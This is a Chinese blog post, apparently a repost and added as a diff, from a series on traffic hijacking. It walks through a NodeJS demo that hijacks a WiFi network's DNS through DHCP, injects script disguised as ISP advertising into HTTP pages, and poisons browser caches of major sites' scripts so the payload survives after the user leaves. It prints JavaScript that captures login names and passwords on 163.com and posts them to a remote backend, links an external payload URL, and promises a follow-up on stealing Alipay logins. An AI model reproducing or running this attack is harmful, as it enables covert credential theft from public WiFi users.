@@ -1,0 +1,116 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="互联网精神病患者小站，始终秉承建站理念：分享是种美德，好人一生平安。"><meta name="keywords" content="网络代理,怎么访问外网,小火箭怎么安装,美国VPS,自定义PAC规则,Hexo博客建站,aardio编程,消费USDT,USDC信用卡,数字货币信用卡,虚拟币出金卡,U币消费卡"><title> 混技能流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 | 搜百谷</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.2"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/latest/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/latest/grids-responsive-min.min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/latest/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"><script src="https://www.googletagmanager.com/gtag/js?id=UA-22119753-2" async></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'UA-22119753-2');
+</script><script type="text/javascript" src="//lib.baomitu.com/clipboard.js/latest/clipboard.min.js"></script><script type="text/javascript" src="//lib.baomitu.com/toastr.js/latest/toastr.min.js"></script><link rel="stylesheet" href="//lib.baomitu.com/toastr.js/latest/toastr.min.css"><meta name="generator" content="Hexo 7.1.1"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden"> 混技能流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒</h1><a id="logo" href="/.">搜百谷</a><p class="description">达则兼济天下尤物，科技改变世界嫩模！</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/software/"><i class="fa fa-university"> 宝库</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title"> 混技能流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒</h1><div class="post-meta">2015-05-14<span> | </span><span class="category"><a href="/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/">搞软件</a></span><span>：</span><span>流量劫持</span><span class="post-time"><span class="post-meta-item-text"> | </span><span class="post-meta-item-icon"><i class="fa fa-keyboard-o"></i><span class="post-count"> 2.7k</span><span class="post-meta-item-text"> 字</span></span></span><span class="post-time"> | <span class="post-meta-item-icon"><i class="fa fa-clock-o"></i><span class="post-count"> 9</span><span class="post-meta-item-text"> 分钟</span></span></span></div><a class="disqus-comment-count" href="/traffic-hijack-wifi-js.html#waline"><span class="waline-comment-count" id="/traffic-hijack-wifi-js.html"></span><span> 条评论</span></a><div class="post-content"><p>在上一篇<a href="/traffic-hijack-in-everypage.html">流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！</a>构思了一个时光机原型，让我们的脚本通过HTTP缓存机制，在未来的某个时刻被执行，因此我们可以实现超大范围的入侵了。</p>
+<p>基于此原理，我们用NodeJS来实现一个简单的样例。得益于node强大的IO管理，以及各种封装好的网络模块，我们可以很容易实现这个想法：</p>
+<span id="more"></span>
+<ul>
+<li>开启一个特殊的DNS服务：所有域名都解析到我们的电脑上。并把Wifi的DHCP-DNS设置为我们的电脑IP。</li>
+<li>之后连上Wifi的用户打开任何网站，请求都将被我们的node服务收到。我们根据http头中的host字段来转发到真正服务器上。</li>
+<li>收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户了！</li>
+<li>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。我们将其感染，并设置超长的缓存时间。<br>
+于是大功告成！</li>
+</ul>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06162848-a43be33249ec4e918b69b53141d13a22.png" alt="" loading="lazy"></p>
+<p>为了方便测试和控制，已把整个流程：DNS、HTTP代理、代码分析和注入都使用NodeJS编写，并整合在一起。下面就来测试一下！</p>
+<p>获取Demo: （<a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/EtherDream/closurether">https://github.com/EtherDream/closurether</a>）</p>
+<p>当然，192.168.1.250这是我本地的IP，推荐使用固定的IP地址。</p>
+<p>打开无线路由器-DHCP配置，将主DNS设置为自己的IP，重启路由。到此，你已经控制了整个无线网络的流量了！</p>
+<p>用另一台电脑连上你的wifi：</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06192851-587e3750ae99488b8eff15c35cafa4dc.png" alt="" loading="lazy"></p>
+<p>这时会发现，ping任何域名，不出意外的话都会返回你的IP，DNS劫持已发挥作用了！</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ping www<span class="selector-class">.baidu</span><span class="selector-class">.com</span></span><br><span class="line">PING www<span class="selector-class">.baidu</span><span class="selector-class">.com</span> (<span class="number">192.168</span>.<span class="number">1.250</span>): <span class="number">56</span> data bytes</span><br><span class="line">Request timeout <span class="keyword">for</span> icmp_seq <span class="number">0</span></span><br><span class="line"></span><br><span class="line">$ ping www<span class="selector-class">.google</span><span class="selector-class">.com</span></span><br><span class="line">PING www<span class="selector-class">.google</span><span class="selector-class">.com</span> (<span class="number">192.168</span>.<span class="number">1.250</span>): <span class="number">56</span> data bytes</span><br><span class="line">Request timeout <span class="keyword">for</span> icmp_seq <span class="number">0</span></span><br></pre></td></tr></table></figure>
+<p>打开任意网页，一切正常。我们可以在node控制台看到用户访问的每一个请求。</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/07141847-ca64c8460da74d16b40e22142c75c5e9.png" alt="" loading="lazy"></p>
+<p>当然这时网页上什么效果也没出现。这个Demo毕竟是个间谍程序，怎么可能会有界面呢？</p>
+<p>想看效果的话修改项目里的<strong>asset/inject/extern.js</strong>，往里面加一条：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">alert</span>(<span class="string">&#x27;Hello World&#x27;</span>);</span></span><br></pre></td></tr></table></figure>
+<p>这时再刷新页面，效果出现了！</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06204013-8082d815f7ad43208a6628d2a4de99c1.png" alt="" loading="lazy"></p>
+<p>打开任意网页的源文件，发现其中都注入了我们的脚本内容。为了隐蔽性，这里将注入的脚本伪装成运营商的url，别人还以为是联通宽带插的广告 ^_^</p>
+<p>具体想伪装成什么地址，可以在config.json里配置。</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06203137-c4ef0bd57dde452388e947c642575268.png" alt="" loading="lazy"></p>
+<p>脚本内容正是asset/inject/extern.js文件：</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06203144-40f01486994e4ee48a2ce53cf4e9a2d9.png" alt="" loading="lazy"></p>
+<p>到此，我们已实现把javascript代码注入到WiFi网络的HTTP流量里了！</p>
+<p>下面测试我们的终极目标：能穿越到未来执行的脚本时光机。</p>
+<p>前面仔细观察的话，不难发现注入的脚本内容里多出一大堆url，这些正是我们需要让用户预加载并缓存的各大网站脚本。具体原理在上一篇里已经详细讲解了。</p>
+<p>如果想入侵更多的网站，往tool/cache-sniffer/url.txt里添加。运行<code>$ phantomjs sniffer.js</code>程序将自动更新注入脚本的内容。</p>
+<p>要想预加载并缓存一个脚本很容易，只需new Image().src=‘…’。当然有少数浏览器不支持，不过ie和chrome都是支持的。尽管js文件并不是一个图片，但仍然会缓存。</p>
+<p>上一篇文章已说明，为了减少一次请求大量脚本文件消耗的带宽，我们并不返回真正的原始脚本文件，而是一个很小的“桩文件”，用来启动我们的入侵代码，以及恢复原始脚本文件。</p>
+<p>因此这个“桩文件”代码量非常少，区区百来字节而已。例如hao123网站下的某个已被感染了的脚本：</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06203434-7576aec443ac427c9662e23a3d8c43ab.png" alt="" loading="lazy"></p>
+<p>我们创建两个script元素，来加载外网的入侵代码，以及恢复原始脚本代码，使网页能正常运行。注意：原始脚本url后面的?1必不可少，否则又会从缓存里加载被感染的当前脚本，进入死循环。</p>
+<p>**　　使用document.write的好处在于，它创建的脚本是异步加载顺序执行的。**所以在原始脚本未加载完之前，后面的脚本不会执行，避免了未定义错误的发生。</p>
+<p>入侵代码的url可以在config.json里hacker_url字段配置。为了保证未来被感染的脚本被唤醒时，能正常调出你的入侵代码，所以选择一个可靠的外网来存放。</p>
+<p>本Demo演示如何入侵并截获网易首页的账号，可以参考代码：<a target="_blank" rel="noopener external nofollow noreferrer" href="http://jslog.sinaapp.com/ad.js">http://jslog.sinaapp.com/ad.js</a>。</p>
+<p>演示中的代码很简单，仅仅捕捉用户在网易首页上输入的账号和密码而已，然后传给后台保存到数据库里。</p>
+<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">url</span> = location.href;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/\.163\.com/i</span>.test(<span class="built_in">url</span>)) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">onSubmit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            post(</span><br><span class="line">                NTES.one(<span class="string">&#x27;#js_loginframe_username&#x27;</span>).value,</span><br><span class="line">                NTES.one(<span class="string">&#x27;input[type=password]&#x27;</span>).value</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        NTES.one(<span class="string">&#x27;.ntes-loginframe-btn&#x27;</span>).addEventListener(<span class="string">&#x27;click&#x27;</span>, onSubmit);</span><br><span class="line"></span><br><span class="line">        NTES.one(<span class="string">&#x27;input[type=password]&#x27;</span>).addEventListener(<span class="string">&#x27;keydown&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (e.keyCode == <span class="number">13</span>) &#123;</span><br><span class="line">                onSubmit();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>下面重启电脑，并连上家里的WiFi。（连过KFC的用户回家之后的情况）</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06210116-4b52e2a47fb240818e8f8928909cc85f.png" alt="" loading="lazy"></p>
+<p><strong>这时用户的流量已完全不在我们的可控之中，看我们的脚本是否仍能从沉睡之中唤醒呢？</strong></p>
+<p>**    **</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://xn--www-282fu0m.163.com">打开www.163.com</a>，一切正常~</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06203443-01358c7aa10a40ff8d2cf447a1602fbc.png" alt="" loading="lazy"></p>
+<p>输入用户名密码，一切正常~</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06203453-ebde80977a004ab894ddf8e091380ae5.png" alt="" loading="lazy"></p>
+<p>似乎并没有感觉到任何的异常。回到我们自己的电脑上来看看，后台的笼子里是否有猎物捕捉到。。。</p>
+<p><img src="http://images.cnitblog.com/blog/273626/201307/06193957-bb77c40e26ca46ebb4cdb98dca510f26.png" alt="" loading="lazy"></p>
+<p>很好，我们的入侵代码已成功执行，在用户离开了我们的网络之后依旧能够运行！只要登录了我们事先感染过的那些网站，入侵代码都将会被唤醒。</p>
+<p>事实上，只要用户不清空缓存，这段代码终将附着在硬盘缓存里，直到过期。有可能是1个星期，甚至数月的时间。</p>
+<p>所谓一时失足成千古恨莫过于此。一时大意连接了一个wifi热点，不经意间间谍已潜入你的浏览器缓存里。。。</p>
+<p>使用NodeJS，我们只需数百行代码就实现了这个想法。当然，简单的同时缺点也是不言而喻的。node只提供了传输层的网络接口，我们无法操作底层网络数据。所以只能使用DNS劫持的方法来获得用户的流量。因此也就产生了一个非常纠结的问题：</p>
+<p>怎样才能确定用户查询的域名是HTTP主机呢？</p>
+<p>由于我们把所有的域名都解析到了自己的电脑上，因此包括其他的网络程序数据也转发到了我们这里。然而我们的node只监听了tcp:80端口，对于其他的端口则是完全忽略的。</p>
+<p>即使我们监听了其他端口，我们也无法把收到的数据转发到真实的服务器 —— 我们根本不知道发到哪个地址上！</p>
+<p><strong>HTTP之所以能实现转发，得益于头部有个host字段</strong>；而非HTTP协议，甚至包括HTTPS，我们只能收到一堆二进制数据，然后就不知道的该交给谁了。</p>
+<p>此问题虽然无法避免，但也有一定程度的解决方案：</p>
+<p>1.) 事先收集各大网站的域名。之后用户查询的域名在列表里的话，直接返回自己的电脑IP；否则转发给外网DNS。</p>
+<p>当记录足够多的话，我们可以拦截住用户大多数的网站流量。</p>
+<p>但要收集大量的网站域名并不容易，而且仍会有不少的遗漏。因此我们使用更简单的方法：</p>
+<p>2.) 仍然将所有的域名解析到自己电脑上，但域名TTL时间很短，几秒后就过期。</p>
+<p>如果在之后的几秒时间里，收到访问这个域名的http请求（host字段是这个域名），那么就认为这个域名是http服务的；</p>
+<p>如果规定时间里没有收到，那么就当做非http服务的域名。当域名ttl过期后，下次再查询这个域名时，就解析到外网真实的服务器IP了。反正不是http协议，收到了也没用。</p>
+<p>3.) 尝试访问前来请求域名的80端口。如果能连接上，就当做是一个Web域名。就返回自己的IP。</p>
+<p>目前使用方法3来识别域名。事实上基于DNS的流量劫持还有更大缺陷：</p>
+<ul>
+<li>如果用户手工设置的DNS怎么办？比如8.8.8.8的用户就非常多。</li>
+<li>不是80端口的网站又如何是好？难道我们要把1~65535的端口都监听吗？</li>
+<li>一个网站域名下同时有http和其他服务了，拦截就导致那个服务不可用了。</li>
+<li>最麻烦的当属纯IP的网站，那么就完全无法拦截了~<br>
+纠结之处就不再吐槽，不然就永远实现不了我们的想法了，以后再使用node扩展慢慢完善。</li>
+</ul>
+<p>即便面临着不少问题，我们的Demo仍能顺利跑起来 —— 完全按照我们的预想运行！</p>
+<p>当然，你在想这招也只能获取普通的账号而已，对于https加密的账号就无能为力了。</p>
+<p>的确如此，不过别忘了https网站是如何登陆的呢？是用户在地址栏一个字符一个字符的敲入<code>https...</code>然后回车吗？</p>
+<p>下一篇将演示如何把javascript注入到支付宝网页，并截获用户的账号和密码。</p>
+<p>原文:<a target="_blank" rel="noopener external nofollow noreferrer" href="http://www.cnblogs.com/index-html/p/wifi_hijack_3.html">http://www.cnblogs.com/index-html/p/wifi_hijack_3.html</a></p>
+<p>流量劫持系列文章目录:</p>
+<p><a href="/traffic-hijack.html" title="[混技能]流量劫持系列1_流量劫持_常见方法_是如何产生的?">流量劫持系列1_流量劫持_常见方法_是如何产生的?</a></p>
+<p><a href="/traffic-hijack-harm.html">流量劫持系列2_流量劫持能有多大危害?</a></p>
+<p><a href="/traffic-hijack-wifi-phone.html">流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包</a></p>
+<p><a href="/traffic-hijack-in-everypage.html">流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！</a></p>
+<p><a href="/traffic-hijack-wifi-js.html">流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒</a></p>
+<p><a href="/traffic-hijack-danger-dialog.html">流量劫持系列6_浮层登录框的隐患</a></p>
+<p><a href="/traffic-hijack-sslstrip.html">流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持</a></p>
+<p><a href="/traffic-hijack-sslstrip-plus.html">流量劫持系列8_SSLStrip终极版_location瞒天过海</a></p>
+<p><a href="/traffic-hijack-mitm-cookie-sniffer.html">流量劫持系列9_沉默中的狂怒_Cookie 大喷发</a></p>
+<p><a href="/traffic-hijack-hsts.html">流量劫持系列10_躲避HSTS的HTTPS劫持</a></p>
+<p><a href="/traffic-hijack-web-hijack.html">流量劫持系列11_浅谈网站流量劫持防范措施</a></p>
+</div><div class="post-copyright"><script type="text/javascript" src="/js/copyright.js?v=1.0.2" successtext="复制成功！"></script><link rel="stylesheet" type="text/css" href="/css/copyright.css?v=1.0.2"><p><span>本文标题：</span> 混技能流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒</p><p><span>文章作者：</span>凹凸曼</p><p><span>发布时间：</span>2015-05-14</p><p><span>最后更新：</span>2024-09-28</p><p><span>原始链接：</span><a href="/traffic-hijack-wifi-js.html">https://sobaigu.com/traffic-hijack-wifi-js.html</a><span class="copy-path"><i class="fa fa-clipboard" data-clipboard-text="https://sobaigu.com/traffic-hijack-wifi-js.html"></i></span></p><p><span>版权声明：</span>转载请务必保留本文链接和注明内容来源，并自负版权等法律责任。</p></div><br><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-7390437336363898" data-ad-slot="7454544896" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});
+</script><div class="tags"></div><div class="post-nav"><a class="pre" href="/traffic-hijack-danger-dialog.html">流量劫持系列6_浮层登录框的隐患</a><a class="next" href="/traffic-hijack-in-everypage.html">流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！</a></div><div class="nofancybox" id="waline"></div><script src="//unpkg.com/@waline/client@v2/dist/waline.js"></script><link rel="stylesheet" type="text/css" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script>let metaInfo = ['nick', 'mail', 'link']
+let requiredMeta = 'nick,mail'.split(',').filter(item => {
+  return metaInfo.indexOf(item) > -1
+})
+Waline.init({
+  el: '#waline',
+  comment: true,
+  serverURL: 'https://waline.sobaigu.com',
+  pageSize: '30',
+  wordLimit: '500',
+  requiredMeta,
+  login: 'disable',
+  reaction: true,
+})
+</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><form class="search-form" action="//www.baidu.com/s" method="get" accept-charset="utf-8" target="_blank"><input type="search" name="word" maxlength="20" placeholder="Search"/><input type="hidden" name="si" value="sobaigu.com"/><input name="tn" type="hidden" value="bds"/><input name="cl" type="hidden" value="3"/><input name="ct" type="hidden" value="2097152"/><input name="s" type="hidden" value="on"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 网站标签</i></div><div class="tagcloud"><a href="/tags/Ubuntu/" style="font-size: 19.71px;">Ubuntu</a> <a href="/tags/Linux/" style="font-size: 23.82px;">Linux</a> <a href="/tags/Windows/" style="font-size: 22.65px;">Windows</a> <a href="/tags/%E6%99%92%E9%85%B7%E8%BD%AF/" style="font-size: 25px;">晒酷软</a> <a href="/tags/%E8%BD%AF%E4%BB%B6/" style="font-size: 22.06px;">软件</a> <a href="/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/" style="font-size: 20.88px;">混技能</a> <a href="/tags/WordPress/" style="font-size: 18.53px;">WordPress</a> <a href="/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/" style="font-size: 23.24px;">博客建站</a> <a href="/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/" style="font-size: 24.41px;">精简绿色去广告版</a> <a href="/tags/%E6%B1%9F%E6%B9%96/" style="font-size: 16.18px;">江湖</a> <a href="/tags/shell/" style="font-size: 20.29px;">shell</a> <a href="/tags/shadowsocks/" style="font-size: 15px;">shadowsocks</a> <a href="/tags/%E5%8A%A0%E9%80%9F%E4%BB%A3%E7%90%86/" style="font-size: 21.47px;">加速代理</a> <a href="/tags/aardio/" style="font-size: 17.94px;">aardio</a> <a href="/tags/python/" style="font-size: 15.59px;">python</a> <a href="/tags/%E6%89%8B%E6%9C%BA/" style="font-size: 17.35px;">手机</a> <a href="/tags/Hexo/" style="font-size: 19.12px;">Hexo</a> <a href="/tags/%E6%B7%98%E5%AE%9D/" style="font-size: 15px;">淘宝</a> <a href="/tags/%E7%BD%91%E8%B5%9A/" style="font-size: 15px;">网赚</a> <a href="/tags/%E5%88%B7%E5%8D%95/" style="font-size: 15px;">刷单</a> <a href="/tags/v2ray/" style="font-size: 16.76px;">v2ray</a> <a href="/tags/%E6%95%99%E7%A8%8B/" style="font-size: 16.76px;">教程</a> <a href="/tags/hugo/" style="font-size: 15px;">hugo</a> <a href="/tags/%E8%99%9A%E6%8B%9F%E5%B8%81/" style="font-size: 15.59px;">虚拟币</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 近期文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/windows-iis-log-with-360xingtu-webview.html">网站服务器使用360星图自动分析IIS日志，并通过网页浏览</a></li><li class="post-list-item"><a class="post-list-link" href="/webhook-install-as-service-in-windows-server.html">Windows Server 部署 webhook 服务，并注册为系统服务守护</a></li><li class="post-list-item"><a class="post-list-link" href="/iis-charset-chinese.html">解决 IIS W3C格式日志中中文路径乱码问题</a></li><li class="post-list-item"><a class="post-list-link" href="/bat-git-clone-auto-public.html">一个BAT批处理实现HTML网页自动同步发布到Windows Server</a></li><li class="post-list-item"><a class="post-list-link" href="/DNS-PROBE-STARTED-issue-on-edge-in-windows-server.html">解决Windows服务器开一段时间edge浏览器就 DNS_PROBE_STARTED 错误</a></li><li class="post-list-item"><a class="post-list-link" href="/bot-spider-names.html">最新搜索引擎蜘蛛机器人User Agent名称</a></li><li class="post-list-item"><a class="post-list-link" href="/linux-jq-syntax-list.html">常用 linux jq 命令语法整理</a></li><li class="post-list-item"><a class="post-list-link" href="/software-postfix-mailinfo-hostname.html">宝塔邮局优化解决 `hostname` 信息得分大幅提升</a></li><li class="post-list-item"><a class="post-list-link" href="/git-set-proxy-for-github.html">设置Git通过代理连接，解决GitHub仓库无法更新等</a></li><li class="post-list-item"><a class="post-list-link" href="/composer-upgrade-error-A-facade-root-has-not-been-set.html">php composer.phar update：A facade root has not been set</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> 最近评论</i></div><div id="widget-waline-list"></div><script type="text/javascript" id="recent-comment" serverURL="https://waline.sobaigu.com" count="6" src="/js/recent-comments.js?v=1.0.2" async="async"></script></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 内容分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%81%9A%E7%BD%91%E7%AB%99/">做网站</a><span class="category-list-count">97</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E7%BC%96%E7%A8%8B/">学编程</a><span class="category-list-count">28</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/">搞软件</a><span class="category-list-count">142</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%94%92%E7%9F%A5%E8%AF%86/">攒知识</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B7%B7X%E5%9C%88/">混X圈</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/">玩系统</a><span class="category-list-count">126</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%9E%8E%E9%80%BC%E9%80%BC/">瞎逼逼</a><span class="category-list-count">4</span></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 友情链接</i></div><ul></ul><a href="http://sobaigu.com/software/" title="软件宝库" target="_blank">软件宝库</a><ul></ul><a href="http://www.jayxon.com/" title="JayXon" target="_blank">JayXon</a><ul></ul><a href="http://www.wubase.com/" title="网联基地" target="_blank">网联基地</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2024 <a href="/." rel="nofollow">搜百谷.</a> Powered by<a rel="nofollow" target="_blank" href="http://sobaigu.com"> 凹凸曼.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=1.0.2" async></script><script type="text/javascript" src="/js/copycode.js?v=1.0.2" successtext="复制成功！"></script><link rel="stylesheet" type="text/css" href="/css/copycode.css?v=1.0.2"><script type="text/javascript" src="/js/codeblock-resizer.js?v=1.0.2"></script><script type="text/javascript" src="/js/smartresize.js?v=1.0.2"></script></div></body></html>
